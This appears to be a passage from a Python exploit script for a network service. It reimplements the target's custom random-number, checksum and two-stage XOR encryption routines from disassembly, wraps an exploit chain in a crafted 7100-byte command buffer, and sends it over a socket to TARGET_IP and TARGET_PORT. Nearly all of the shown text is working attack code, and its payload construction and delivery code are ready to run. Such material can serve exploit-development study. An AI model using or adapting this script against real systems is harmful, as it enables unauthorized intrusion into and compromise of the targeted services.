    EDX = EAX = ESI = EBX = EDX = ECX = 0
    EBX = ctypes.c_uint32(qword_9ED208[LOW_QWORD]).value# mov ebx, dword ptr qword_9ED208+4
    ESI = ctypes.c_uint32(qword_9ED208[HIGH_QWORD]).value# mov esi, dword ptr qword_9ED208
    EAX = EBX# mov eax, ebx
    ECX = ctypes.c_uint32(0x15A).value# mov ecx, 15Ah
    EBX = ctypes.c_uint32(0x4E35).value# mov ebx, 4E35h
    if EAX != 0:
        EDX = ctypes.c_uint32((EAX * EBX) >> 32).value
        EAX = ctypes.c_uint32(EAX * EBX).value
    temp = ctypes.c_uint32(EAX).value # xchg eax, ecx
    EAX  = ctypes.c_uint32(ECX).value # xchg eax, ecx
    ECX  = ctypes.c_uint32(temp).value # xchg eax, ecx
    EDX  = ctypes.c_uint32((EAX * ESI) >> 32).value # Store high bits in EDX for multiplication
    EAX  = ctypes.c_uint32(EAX * ESI).value # mul esi
    EAX  = ctypes.c_uint32(EAX + ECX).value # add eax, ecx
    temp = ctypes.c_uint32(EAX).value # xchg eax, esi
    EAX  = ctypes.c_uint32(ESI).value # xchg eax, esi
    ESI  = ctypes.c_uint32(temp).value # xchg eax, esi
    EDX  = ctypes.c_uint32((EAX * EBX) >> 32).value # Store high bits in EDX for multiplication
    EAX  = ctypes.c_uint32(EAX * EBX).value # mul ebx
    EDX  = ctypes.c_uint32(EDX + ESI).value # add edx, esi
    SF   = ctypes.c_uint8(int(bool((EAX+1) & 0x80000000))).value # sign flag
    EAX  = ctypes.c_uint32(EAX + 1).value # add eax, 1
    CF   = ctypes.c_uint8(int(bool((EAX+1) & 0x80000000)) ^ SF).value # carry flag
    EDX  = ctypes.c_uint32(EDX + CF).value # adc edx, 0
    EBX  = ctypes.c_uint32(EAX).value # mov ebx, eax
    ESI  = ctypes.c_uint32(EDX).value # mov esi, edx
    qword_9ED208[HIGH_QWORD] = ctypes.c_uint32(EBX).value # mov dword ptr qword_9ED208, ebx
    qword_9ED208[LOW_QWORD]  = ctypes.c_uint32(ESI).value # mov dword ptr qword_9ED208+4, esi
    EAX = ctypes.c_uint32(ESI).value # mov eax, esi
    EAX = ctypes.c_uint32(EAX & 0x7fffffff).value # and eax, 7fffffffh
    ESI = EBX = 0 # For debugging
    return EAX

def decrypt_bytes(BUFFER_LEN, BUFFER, SEED_VALUE=0x037ba4d4):
    global EDX_GLOBAL

    if BUFFER_LEN == 0:
        return

    STORED_BUFFER = list(BUFFER) # Convert bytes to list of integers
    XOR_KEY = 0
    
    seed_rng(SEED_VALUE) # call seed_rng
    for i in range(BUFFER_LEN):
        XOR_KEY = ctypes.c_uint8(get_large_random() % 256).value
        XOR_VAL = ctypes.c_uint8(STORED_BUFFER[i]).value
        STORED_BUFFER[i] = ctypes.c_uint8(XOR_KEY ^ XOR_VAL).value

        if DEBUG:
            print(f'[{i:04}]: {hex(XOR_VAL)[2:]:02} ^ {hex(XOR_KEY)[2:]:02} = {hex(STORED_BUFFER[i])[2:]:02}')

    return bytes(STORED_BUFFER) # Convert back to bytes

def generate_checksum_value(checkval):
    EBX = EDX = ECX = EAX = 0
    EAX = ctypes.c_uint32(checkval).value # mov eax, dword ptr [ebp+0ch]
    ECX = ctypes.c_uint16(0x00b1).value # mov ecx, 0b1h
    EDX = 0 # xor edx, edx
    EDX = ctypes.c_uint32(EAX % ECX).value # EDX = remainder
    EAX = ctypes.c_uint32(int(EAX / ECX)).value # EAX = dividend and quotient
    ECX = ctypes.c_int32(EDX * 0x00ab).value # imul ecx, edx, 0abh
    EAX = ctypes.c_uint32(checkval).value # mov eax, dword ptr [ebp+0ch]
    EBX = ctypes.c_uint16(0x00b1).value # mov ebx, 0b1h
    EDX = 0 # xor edx, edx
    EDX = ctypes.c_uint32(EAX % EBX).value # EDX = remainder
    EAX = ctypes.c_uint32(int(EAX / EBX)).value # EAX = quotient && dividend
    EAX = ctypes.c_uint32(EAX + EAX).value # add eax, eax
    ECX = ctypes.c_uint32(ECX - EAX).value # sub ecx, eax 
    result = ECX # mov dword ptr [ebp+result], ecx
    AX = ctypes.c_uint16(result).value # mov ax, word ptr [ebp - 4]
    AX = ctypes.c_uint16(AX & 0x7fff).value # and ax, 7fffh
    EAX = ctypes.c_uint32(EAX & 0xFFFF0000).value # ... test val
    EAX = ctypes.c_uint32(EAX | AX).value # ... test val
    return AX # retn

def deobfuscate_buffer_with_checksum(initial_checksum, buffer, buffer_len) -> bytes:
    if buffer_len == 0:
        return buffer

    buf = list(buffer) # Convert bytes to list of integers

    checksum = generate_checksum_value(initial_checksum)

    for i in range(buffer_len):
        checksum = generate_checksum_value(checksum)
        buf[i] = ctypes.c_uint8(buf[i] ^ checksum).value

    return bytes(buf) # Convert back to bytes

def ps_command_buffer_checksum(buffer, size):
    EBX = buffer # base pointer for memory addresses pointing to buffer 
    EAX = 0 # accumulator return value
    ECX = 0 # counter for loop

    for ECX in range (size):
        EAX = ctypes.c_int32(EAX << 4).value # shl eax, 4
        EDX = 0 # xor edx, edx
        EDX = ctypes.c_uint8(EBX[ECX]).value # mov dl, [ebx]
        EAX = ctypes.c_uint32(EAX+EDX).value # add eax, edx
        EDX = EAX # mov edx, eax
        EDX = EDX & 0xF0000000 # and edx, 0xf0000000
        if EDX != 0:
            ESI = EDX # mov esi, edx
            ESI = ESI >> 24 # shr esi, 18h
            EAX = ctypes.c_uint32(EAX^ESI).value # xor eax, esi
        EDX = ctypes.c_uint32(~EDX).value # not edx
        EAX = ctypes.c_uint32(EAX&EDX).value # and eax, edx

    return ctypes.c_int32(EAX).value

def build_command_header(SZ) -> bytes:
    sz = struct.pack("<L", SZ)
    ps_command_header =  struct.pack("<L", 0x44444444)  # no clue
    ps_command_header += struct.pack("<L", 0x14)        # This is the offset of memory where we have our buffer
    ps_command_header += struct.pack("<L", 0x0A958)     # This is the third checksum
    ps_command_header += struct.pack("<L", 0x0C9)       # OPCODE FOUR used as the opcode for branching
    ps_command_header += sz + sz

    return ps_command_header

def get_payload_sz(cb_command_buffer):
    num_opcodes = 4
    bytes_per_opcode  = 4
    sz = (num_opcodes * bytes_per_opcode) + cb_command_buffer

    return sz

def build_command_buffer(ps_command_agent: bytes, buffer: bytes, cb_command_buffer) -> bytes:
    buffer_list = list(buffer[4:])
    cbuf_checksum = ps_command_buffer_checksum(buffer_list, cb_command_buffer - 4)
    ps_command_buffer = struct.pack("<L", cbuf_checksum) + bytes(buffer_list)

    if DEBUG:
        print("\nps_command_buffer")
        print_debug(ps_command_buffer)
        print("end: ps_command_buffer\n")
        print(f"checkvalue: {hex(cbuf_checksum)}")

    return ps_command_agent + ps_command_buffer

def build_command_agent(sz_payload, cb_command_buffer) -> bytes:
    encode = struct.pack("<L", 0x010795ef) # checksum needed by second encryption
    cb_command_agent = sz_payload - cb_command_buffer # used as an offset to the ps_command_buffer
    cb_header = struct.pack("<L", cb_command_agent) # cb_header + cb_buffer need to == cb_buffer
    checksum = struct.pack("<L", 0x0000A953) # checksum value that comes after the encryption routines
    cb_com_buf = struct.pack("<L", cb_command_buffer) # 3 values are checked in an if statement after the encryption
    ps_command_agent = encode + cb_header + checksum + cb_com_buf

    if DEBUG:
        print("\nps_command_agent")
        print_debug(ps_command_agent)
        print("end: ps_command_agent\n")

    return ps_command_agent

def phase_one_encryption(ps_command_buffer) -> bytes:
    buf = ps_command_buffer[4:]
    icvec = buf[:4]
    buf_len = len(buf)
    initial_checksum = ctypes.c_uint32(
            icvec[3] << 24 | icvec[2] << 16 | icvec[1] << 8 | icvec[0] << 0
        ).value
    phase_one_encrypted = struct.pack("<L", initial_checksum) + deobfuscate_buffer_with_checksum(initial_checksum, buf, buf_len)

    if DEBUG:
        print("phase_one_encrypted")
        print(f"checksum:\t{hex(initial_checksum)}")
        print_debug(phase_one_encrypted)
        print("enc: phase_one_encrypted\n")

    return phase_one_encrypted

def phase_two_encryption(phase_one_encrypted) -> bytes:
    size_phase_one = len(phase_one_encrypted)
    phase_two_encrypted = decrypt_bytes(size_phase_one, phase_one_encrypted)
    
    if DEBUG:
        print("phase_two_encrypted")
        print_debug(phase_two_encrypted)
        print("end phase_two_encrypted\n")

    return phase_two_encrypted

def do_two_phase_encryption(ps_command_buffer) -> bytes:
    phase_one_encrypted = phase_one_encryption(ps_command_buffer)
    phase_two_encrypted = phase_two_encryption(phase_one_encrypted)

    return phase_two_encrypted

def build_payload():
    cb_command_buffer = 7100

    sz_payload = get_payload_sz(cb_command_buffer)
    ps_command_header = build_command_header(sz_payload)
    szmax_expchain = cb_command_buffer - len(ps_command_header)
    exploit_chain = build_exploitchain(szmax_expchain)
    header_and_chain = ps_command_header + exploit_chain
    ps_command_agent = build_command_agent(sz_payload, cb_command_buffer)
    ps_command_buffer = build_command_buffer(ps_command_agent, header_and_chain, cb_command_buffer)
    encrypted_command_buffer = do_two_phase_encryption(ps_command_buffer)
    sz_everything = struct.pack('>L', sz_payload)
    payload = sz_everything + encrypted_command_buffer

    if DEBUG:
        print("payload")
        print_debug(payload)
        print("end payload") 

    return payload

def tcp_recv(client: socket):
    response = client.recv(4096) 
    print('[*] response:\n')
    print(response.hex())

def send_exploit(buffer: bytes, target_host, target_port, udp = False):

    if udp:
        print("[+] Creating UDP Socket")
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.sendto(buffer, (target_host, target_port))
        print(f'[+] sent {len(buffer)} bytes')

        resp, addr = client.recvfrom(4096)
        print('[*] response:\n')
        print(resp)

    else:
        print("[+] Creating TCP Socket")
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_host, target_port))

        # we need to get the initial blob of what ever the server is sending
        n_reads = 2
        while n_reads:
            tcp_recv(client)
            n_reads -= 1

        print(f"[+] Server Awaits Data")

        client.send(buffer)
        print(f'[+] sent {len(buffer)} bytes')

        client.send(buffer)
        # tcp_recv(client)

def print_debug(ENCRYPTED):
    count = 0
    for i in ENCRYPTED:
        if count % 16 == 0:
            print(f"{count:04}:\t\t", end = "")
        count = count + 1
        print(f"{hex(i)[2:]:2}", end = "")
        if count % 16 == 0:
            print("")
        elif count % 8 == 0:
            print("", end = "-")
        else:
            print("", end = " ")
    print("...")

def main():
    ip = TARGET_IP 
    port = TARGET_PORT 

    payload = build_payload()
    send_exploit(payload, ip, port, False)

if __name__ == '__main__':
    main()
